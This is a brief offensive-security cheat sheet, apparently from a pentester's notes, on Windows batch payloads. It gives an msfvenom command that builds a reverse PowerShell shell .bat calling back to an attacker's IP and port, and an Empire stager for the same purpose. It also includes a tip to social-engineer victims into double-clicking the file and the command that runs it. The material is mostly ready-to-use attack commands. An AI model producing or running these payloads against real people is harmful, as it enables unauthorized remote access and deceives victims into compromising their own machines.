# Batch

## 01 - Generate Payloads

### 1.1 - `msfvenom`

```
$ msfvenom -p cmd/windows/reverse_powershell lhost=<IP> lport=<PORT> -f raw -o payload.bat
```

### 1.2 - Empire

```
(Empire) > usestager windows/launcher_bat
```

## 02 - Execute Payloads

> [!TIP] Batch Payloads
> You can actually social engineer the victim to double click the `.bat` or `.cmd` to establish connection.

```
C:\> .\payload.bat
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures Phases/F - Post Exploitation/0x01 - Defense Evasion/08 - Obfuscate Artifacts/Obfuscation/Malware Development/Obfuscation Techniques/String Manipulation/Windows/Batch]]